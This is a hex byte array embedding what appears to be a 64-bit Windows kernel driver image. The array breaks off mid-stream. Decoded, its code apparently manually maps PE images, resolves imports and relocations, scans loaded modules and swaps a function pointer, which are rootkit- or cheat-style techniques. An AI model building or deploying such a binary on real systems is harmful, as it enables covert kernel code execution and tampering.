	0x44, 0x4f, 0x53, 0x20, 0x6d, 0x6f, 0x64, 0x65, 0x2e, 0x0d, 0x0d, 0x0a,
	0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0xc7, 0x11, 0x4f,
	0x1d, 0xa6, 0x7f, 0x1c, 0x1d, 0xa6, 0x7f, 0x1c, 0x1d, 0xa6, 0x7f, 0x1c,
	0x46, 0xce, 0x7c, 0x1d, 0x1f, 0xa6, 0x7f, 0x1c, 0x46, 0xce, 0x7e, 0x1d,
	0x1e, 0xa6, 0x7f, 0x1c, 0x1d, 0xa6, 0x7e, 0x1c, 0x12, 0xa6, 0x7f, 0x1c,
	0xaa, 0xd7, 0x7b, 0x1d, 0x1f, 0xa6, 0x7f, 0x1c, 0xaa, 0xd7, 0x7f, 0x1d,
	0x1c, 0xa6, 0x7f, 0x1c, 0xaa, 0xd7, 0x7d, 0x1d, 0x1c, 0xa6, 0x7f, 0x1c,
	0x52, 0x69, 0x63, 0x68, 0x1d, 0xa6, 0x7f, 0x1c, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00,
	0xa9, 0x19, 0x68, 0x5f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xf0, 0x00, 0x22, 0x00, 0x0b, 0x02, 0x0e, 0x1b, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
	0x0a, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x70, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0xab, 0x98, 0x00, 0x00,
	0x01, 0x00, 0x60, 0x01, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
	0x48, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
	0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x20, 0x00, 0x00,
	0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
	0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
	0x8b, 0x0f, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2e, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x24, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
	0x00, 0x04, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
	0x2e, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0xc8, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x90, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
	0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x2e, 0x65, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
	0x49, 0x4e, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0xd2, 0x01, 0x00, 0x00,
	0x00, 0x60, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0xca, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
	0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x49, 0x8b,
	0xf0, 0x49, 0x8b, 0xc8, 0x48, 0x8b, 0xda, 0xe8, 0x44, 0x01, 0x00, 0x00,
	0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x5c,
	0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f,
	0x48, 0xff, 0xe0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c,
	0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x81, 0xec, 0x30,
	0x01, 0x00, 0x00, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0xff, 0x15, 0xb9,
	0x0f, 0x00, 0x00, 0x3c, 0x01, 0x0f, 0x85, 0xd6, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xdb, 0x0f, 0x84, 0xcd, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x0c, 0x00,
	0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x48, 0x8b, 0xd3, 0xe8, 0x11,
	0x08, 0x00, 0x00, 0x84, 0xc0, 0x0f, 0x84, 0xb2, 0x00, 0x00, 0x00, 0xb8,
	0x89, 0x67, 0x00, 0x00, 0x66, 0x39, 0x44, 0x24, 0x20, 0x0f, 0x85, 0xa2,
	0x00, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x24, 0x33, 0xc9, 0xff, 0x15, 0x61,
	0x0f, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x75, 0x0e, 0x48,
	0xc7, 0x07, 0x17, 0x00, 0x00, 0xc0, 0x33, 0xc0, 0xe9, 0x8c, 0x00, 0x00,
	0x00, 0x44, 0x8b, 0x44, 0x24, 0x24, 0x48, 0x8d, 0x53, 0x08, 0x48, 0x8b,
	0xce, 0xe8, 0xc6, 0x07, 0x00, 0x00, 0x33, 0xd2, 0x84, 0xc0, 0x75, 0x12,
	0x48, 0x8b, 0xce, 0xff, 0x15, 0x33, 0x0f, 0x00, 0x00, 0x48, 0xc7, 0x07,
	0x05, 0x00, 0x00, 0xc0, 0xeb, 0xd0, 0x41, 0xb8, 0xff, 0x00, 0x00, 0x00,
	0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0x8a, 0x0b, 0x00, 0x00, 0x48, 0x8d,
	0x54, 0x24, 0x30, 0x48, 0x8b, 0xce, 0xe8, 0xe5, 0x00, 0x00, 0x00, 0x48,
	0x63, 0xe8, 0x49, 0x83, 0xc8, 0xff, 0x48, 0x8d, 0x44, 0x24, 0x30, 0x49,
	0xff, 0xc0, 0x42, 0x80, 0x3c, 0x00, 0x00, 0x75, 0xf6, 0x49, 0xff, 0xc0,
	0x48, 0x8d, 0x54, 0x24, 0x30, 0x48, 0x8d, 0x4b, 0x08, 0xe8, 0x6a, 0x07,
	0x00, 0x00, 0x33, 0xd2, 0x48, 0x8b, 0xce, 0xff, 0x15, 0xdb, 0x0e, 0x00,
	0x00, 0x48, 0x89, 0x2f, 0xe9, 0x79, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xd7,
	0x48, 0x8b, 0xcb, 0xff, 0x15, 0xcf, 0x1e, 0x00, 0x00, 0x4c, 0x8d, 0x9c,
	0x24, 0x30, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x6b,
	0x18, 0x49, 0x8b, 0x73, 0x20, 0x49, 0x8b, 0xe3, 0x5f, 0xc3, 0xcc, 0xcc,
	0x48, 0x83, 0xec, 0x28, 0x41, 0xb8, 0x15, 0x00, 0x00, 0x00, 0x48, 0x8d,
	0x15, 0x8b, 0x1e, 0x00, 0x00, 0xe8, 0x5e, 0x06, 0x00, 0x00, 0x48, 0x8d,
	0x0d, 0xef, 0x0b, 0x00, 0x00, 0xe8, 0xc6, 0x04, 0x00, 0x00, 0x48, 0x85,
	0xc0, 0x75, 0x17, 0x4c, 0x8d, 0x05, 0xee, 0x0b, 0x00, 0x00, 0x33, 0xd2,
	0x8d, 0x4a, 0x4d, 0x48, 0x83, 0xc4, 0x28, 0x48, 0xff, 0x25, 0x5e, 0x0e,
	0x00, 0x00, 0x4c, 0x8d, 0x05, 0x07, 0x0c, 0x00, 0x00, 0x48, 0x8b, 0xc8,
	0x48, 0x8d, 0x15, 0x1d, 0x0c, 0x00, 0x00, 0xe8, 0x44, 0x03, 0x00, 0x00,
	0x48, 0x8b, 0xd0, 0x48, 0x85, 0xc0, 0x75, 0x09, 0x4c, 0x8d, 0x05, 0x29,
	0x0c, 0x00, 0x00, 0xeb, 0xc9, 0x48, 0x63, 0x48, 0x03, 0x48, 0x8d, 0x05,
	0x68, 0xfe, 0xff, 0xff, 0x48, 0x87, 0x44, 0x11, 0x07, 0x48, 0x89, 0x05,
	0x38, 0x1e, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc,
	0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x48, 0x89,
	0x74, 0x24, 0x20, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
	0x48, 0x83, 0xec, 0x20, 0xb8, 0x4d, 0x5a, 0x00, 0x00, 0x4c, 0x8b, 0xfa,
	0x48, 0x8b, 0xf1, 0x66, 0x39, 0x01, 0x74, 0x19, 0x48, 0x8d, 0x15, 0x05,
	0x0c, 0x00, 0x00, 0x49, 0x8b, 0xcf, 0xe8, 0xee, 0x06, 0x00, 0x00, 0xb8,
	0xbb, 0x00, 0x00, 0xc0, 0xe9, 0xa3, 0x01, 0x00, 0x00, 0x48, 0x63, 0x59,
	0x3c, 0x33, 0xc9, 0x48, 0x03, 0xde, 0x8b, 0x53, 0x50, 0xff, 0x15, 0xc9,
	0x0d, 0x00, 0x00, 0x45, 0x33, 0xed, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0,
	0x75, 0x1d, 0x44, 0x8b, 0x43, 0x50, 0x48, 0x8d, 0x15, 0xfb, 0x0b, 0x00,
	0x00, 0x49, 0x8b, 0xcf, 0xe8, 0xb4, 0x06, 0x00, 0x00, 0xb8, 0x17, 0x00,
	0x00, 0xc0, 0xe9, 0x69, 0x01, 0x00, 0x00, 0x44, 0x8b, 0x43, 0x54, 0x48,
	0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xe8, 0xca, 0x06, 0x00, 0x00, 0x44, 0x0f,
	0xb7, 0x73, 0x14, 0x41, 0x0f, 0xb7, 0xed, 0x4c, 0x03, 0xf3, 0x41, 0xbc,
	0x01, 0x00, 0x00, 0x00, 0x66, 0x44, 0x3b, 0x6b, 0x06, 0x73, 0x32, 0x0f,
	0xb7, 0xc5, 0x48, 0x8d, 0x0c, 0x80, 0x41, 0x8b, 0x44, 0xce, 0x28, 0x85,
	0xc0, 0x74, 0x18, 0x41, 0x8b, 0x54, 0xce, 0x2c, 0x44, 0x8b, 0xc0, 0x41,
	0x8b, 0x4c, 0xce, 0x24, 0x48, 0x03, 0xd6, 0x48, 0x03, 0xcf, 0xe8, 0x89,
	0x06, 0x00, 0x00, 0x66, 0x41, 0x03, 0xec, 0x66, 0x3b, 0x6b, 0x06, 0x72,
	0xce, 0x8b, 0x83, 0x90, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x79, 0x48,
	0x8d, 0x34, 0x07, 0x44, 0x39, 0x6e, 0x10, 0x74, 0x6f, 0x8b, 0x6e, 0x0c,
	0x48, 0x03, 0xef, 0x48, 0x8b, 0xcd, 0xe8, 0x69, 0x03, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0x8b, 0xc8, 0x48, 0x85, 0xc0, 0x0f, 0x84,
	0x19, 0x01, 0x00, 0x00, 0x44, 0x8b, 0x76, 0x10, 0x44, 0x8b, 0x26, 0x4c,
	0x03, 0xf7, 0x4c, 0x03, 0xe7, 0xeb, 0x2c, 0x4d, 0x8b, 0x2c, 0x24, 0x48,
	0x8d, 0x57, 0x02, 0x49, 0x03, 0xd5, 0xe8, 0x99, 0x02, 0x00, 0x00, 0x48,
	0x85, 0xc0, 0x0f, 0x84, 0xd1, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24,
	0x50, 0x49, 0x83, 0xc4, 0x08, 0x49, 0x89, 0x06, 0x49, 0x83, 0xc6, 0x08,
	0x45, 0x33, 0xed, 0x4d, 0x39, 0x2e, 0x75, 0xcf, 0x48, 0x83, 0xc6, 0x14,
	0x44, 0x39, 0x6e, 0x10, 0x75, 0x97, 0x41, 0xbc, 0x01, 0x00, 0x00, 0x00,
	0x8b, 0x83, 0xb0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x75, 0x48, 0x8d,
	0x14, 0x07, 0x45, 0x8b, 0xdd, 0x44, 0x39, 0xab, 0xb4, 0x00, 0x00, 0x00,
	0x76, 0x65, 0x44, 0x8b, 0x52, 0x04, 0x4c, 0x8d, 0x4a, 0x08, 0x8b, 0x2a,
	0x49, 0x83, 0xea, 0x08, 0x49, 0xd1, 0xea, 0x48, 0x03, 0xef, 0x41, 0x8b,
	0xf5, 0x45, 0x85, 0xd2, 0x74, 0x39, 0x41, 0x0f, 0xb7, 0x01, 0x44, 0x8b,
	0xc0, 0x41, 0xc1, 0xe8, 0x0c, 0x45, 0x85, 0xc0, 0x74, 0x1d, 0x41, 0x83,
	0xf8, 0x0a, 0x0f, 0x85, 0x9d, 0x00, 0x00, 0x00, 0x8b, 0xc8, 0x48, 0x8b,
	0xc7, 0x48, 0x2b, 0x43, 0x30, 0x81, 0xe1, 0xff, 0x0f, 0x00, 0x00, 0x48,
	0x01, 0x04, 0x29, 0x41, 0x03, 0xf4, 0x49, 0x83, 0xc1, 0x02, 0x41, 0x3b,
	0xf2, 0x72, 0xc7, 0x44, 0x03, 0x5a, 0x04, 0x49, 0x8b, 0xd1, 0x44, 0x3b,
	0x9b, 0xb4, 0x00, 0x00, 0x00, 0x72, 0x9b, 0x8b, 0x43, 0x28, 0x33, 0xd2,
	0x48, 0x03, 0xc7, 0x48, 0x8b, 0xcf, 0xff, 0xd0, 0x48, 0x8b, 0x5c, 0x24,
	0x58, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48,
	0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f,
	0xc3, 0x4c, 0x8d, 0x47, 0x02, 0x4c, 0x8b, 0xcd, 0x4d, 0x03, 0xc5, 0x48,
	0x8d, 0x15, 0xa2, 0x0a, 0x00, 0x00, 0x49, 0x8b, 0xcf, 0xe8, 0x0b, 0x05,
	0x00, 0x00, 0xbb, 0x25, 0x02, 0x00, 0xc0, 0xeb, 0x38, 0x4c, 0x8b, 0xc5,
	0x48, 0x8d, 0x15, 0x69, 0x0a, 0x00, 0x00, 0x49, 0x8b, 0xcf, 0xe8, 0xf2,
	0x04, 0x00, 0x00, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0xe6, 0x0b,
	0x00, 0x00, 0xb8, 0x25, 0x02, 0x00, 0xc0, 0xeb, 0x9f, 0x48, 0x8d, 0x15,
	0x98, 0x0a, 0x00, 0x00, 0x49, 0x8b, 0xcf, 0xe8, 0xd1, 0x04, 0x00, 0x00,
	0xbb, 0xbb, 0x00, 0x00, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xff, 0x15,
	0xc0, 0x0b, 0x00, 0x00, 0x8b, 0xc3, 0xe9, 0x79, 0xff, 0xff, 0xff, 0xcc,
	0x41, 0x8a, 0x00, 0x84, 0xc0, 0x74, 0x1c, 0x48, 0x2b, 0xca, 0x4c, 0x2b,
	0xc2, 0x3c, 0x78, 0x75, 0x07, 0x8a, 0x02, 0x38, 0x04, 0x11, 0x75, 0x0e,
	0x48, 0xff, 0xc2, 0x41, 0x8a, 0x04, 0x10, 0x84, 0xc0, 0x75, 0xea, 0xb0,
	0x01, 0xc3, 0x32, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
	0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
	0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xe9, 0x4d,
	0x8b, 0xf0, 0x8b, 0xf2, 0x4c, 0x8b, 0xf9, 0x48, 0x83, 0xc8, 0xff, 0x48,
	0xff, 0xc0, 0x42, 0x80, 0x3c, 0x08, 0x00, 0x75, 0xf6, 0x2b, 0xf0, 0x33,
	0xdb, 0x0f, 0xae, 0xe8, 0x8b, 0xfb, 0x4c, 0x8b, 0xc5, 0x49, 0x03, 0xff,
	0x49, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xe8, 0x89, 0xff, 0xff, 0xff, 0x84,
	0xc0, 0x75, 0x0a, 0xff, 0xc3, 0x3b, 0xde, 0x76, 0xe3, 0x33, 0xc0, 0xeb,
	0x03, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c,
	0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x20, 0x41,
	0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
	0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
	0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec,
	0x20, 0x48, 0x63, 0x71, 0x3c, 0x45, 0x33, 0xe4, 0x48, 0x03, 0xf1, 0x4d,
	0x8b, 0xf0, 0x4c, 0x8b, 0xfa, 0x48, 0x8b, 0xe9, 0x45, 0x8b, 0xcc, 0x41,
	0x8b, 0xdc, 0x0f, 0xb7, 0x7e, 0x14, 0x48, 0x03, 0xfe, 0x66, 0x44, 0x3b,
	0x66, 0x06, 0x73, 0x49, 0x8b, 0xc3, 0x48, 0x8d, 0x14, 0x80, 0x81, 0x7c,
	0xd7, 0x18, 0x50, 0x41, 0x47, 0x45, 0x74, 0x11, 0x81, 0x7c, 0xd7, 0x18,
	0x2e, 0x74, 0x65, 0x78, 0x75, 0x25, 0x80, 0x7c, 0xd7, 0x1c, 0x74, 0x75,
	0x1e, 0x8b, 0x4c, 0xd7, 0x24, 0x4d, 0x8b, 0xce, 0x8b, 0x54, 0xd7, 0x20,
	0x48, 0x03, 0xcd, 0x4d, 0x8b, 0xc7, 0xe8, 0x0d, 0xff, 0xff, 0xff, 0x4c,
	0x8b, 0xc8, 0x48, 0x85, 0xc0, 0x75, 0x0a, 0x0f, 0xb7, 0x4e, 0x06, 0xff,
	0xc3, 0x3b, 0xd9, 0x72, 0xb7, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x49, 0x8b,
	0xc1, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48,
	0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e,
	0x41, 0x5c, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
	0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0xb8, 0x4d, 0x5a, 0x00, 0x00,
	0x48, 0x8b, 0xf2, 0x4c, 0x8b, 0xc1, 0x66, 0x39, 0x01, 0x75, 0x54, 0x48,
	0x63, 0x41, 0x3c, 0x8b, 0x8c, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xc9,
	0x74, 0x45, 0x4d, 0x8d, 0x0c, 0x08, 0x33, 0xd2, 0x41, 0x8b, 0x49, 0x20,
	0x41, 0x8b, 0x79, 0x18, 0x49, 0x03, 0xc8, 0x85, 0xff, 0x74, 0x30, 0x8b,
	0x01, 0x48, 0x8b, 0xde, 0x49, 0x03, 0xc0, 0x48, 0x2b, 0xd8, 0x44, 0x0f,
	0xb6, 0x10, 0x44, 0x0f, 0xb6, 0x1c, 0x18, 0x45, 0x2b, 0xd3, 0x75, 0x08,
	0x48, 0xff, 0xc0, 0x45, 0x85, 0xdb, 0x75, 0xea, 0x45, 0x85, 0xd2, 0x74,
	0x1c, 0xff, 0xc2, 0x48, 0x83, 0xc1, 0x04, 0x3b, 0xd7, 0x72, 0xd0, 0x33,
	0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48, 0x8b, 0x74, 0x24, 0x10, 0x48,
	0x8b, 0x7c, 0x24, 0x18, 0xc3, 0x41, 0x8b, 0x41, 0x24, 0x41, 0x8b, 0x49,
	0x1c, 0x49, 0x03, 0xc0, 0x49, 0x03, 0xc8, 0x0f, 0xb7, 0x14, 0x50, 0x8b,
	0x04, 0x91, 0x49, 0x03, 0xc0, 0xeb, 0xd6, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
	0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x57,
	0x48, 0x81, 0xec, 0x50, 0x01, 0x00, 0x00, 0x33, 0xdb, 0x4c, 0x8d, 0x48,
	0x10, 0x48, 0x8b, 0xe9, 0x89, 0x58, 0x10, 0x45, 0x33, 0xc0, 0x33, 0xd2,
	0x8d, 0x73, 0x0b, 0x8b, 0xce, 0xff, 0x15, 0xe9, 0x09, 0x00, 0x00, 0x3d,
	0x04, 0x00, 0x00, 0xc0, 0x74, 0x1c, 0x44, 0x8b, 0xc8, 0x4c, 0x8d, 0x05,
	0x60, 0x08, 0x00, 0x00, 0x33, 0xd2, 0x8d, 0x4a, 0x4d, 0xff, 0x15, 0x65,
	0x09, 0x00, 0x00, 0x33, 0xc0, 0xe9, 0x1c, 0x01, 0x00, 0x00, 0x8b, 0x94,
	0x24, 0x68, 0x01, 0x00, 0x00, 0x33, 0xc9, 0xff, 0x15, 0x57, 0x09, 0x00,
	0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x11, 0x44, 0x8b, 0x8c,
	0x24, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x05, 0x68, 0x08, 0x00, 0x00,
	0xeb, 0xc6, 0x44, 0x8b, 0x84, 0x24, 0x68, 0x01, 0x00, 0x00, 0x45, 0x33,
	0xc9, 0x48, 0x8b, 0xd7, 0x8b, 0xce, 0xff, 0x15, 0x88, 0x09, 0x00, 0x00,
	0x0f, 0xae, 0xe8, 0x85, 0xc0, 0x79, 0x1a, 0x33, 0xd2, 0x4c, 0x8d, 0x05,
	0x70, 0x08, 0x00, 0x00, 0x44, 0x8b, 0xc8, 0x8d, 0x4a, 0x4d, 0xff, 0x15,
	0x04, 0x09, 0x00, 0x00, 0xe9, 0xaf, 0x00, 0x00, 0x00, 0x8b, 0xf3, 0x39,
	0x1f, 0x0f, 0x86, 0xa5, 0x00, 0x00, 0x00, 0x8b, 0xc6, 0xba, 0x02, 0x00,
	0x00, 0x00, 0x48, 0x69, 0xc8, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x47,
	0x08, 0x48, 0x03, 0xc1, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x0f, 0x10, 0x00,
	0x0f, 0x10, 0x48, 0x10, 0x48, 0x8d, 0x80, 0x80, 0x00, 0x00, 0x00, 0x0f,
	0x11, 0x01, 0x0f, 0x10, 0x40, 0xa0, 0x0f, 0x11, 0x49, 0x10, 0x0f, 0x10,
	0x48, 0xb0, 0x0f, 0x11, 0x41, 0x20, 0x0f, 0x10, 0x40, 0xc0, 0x0f, 0x11,
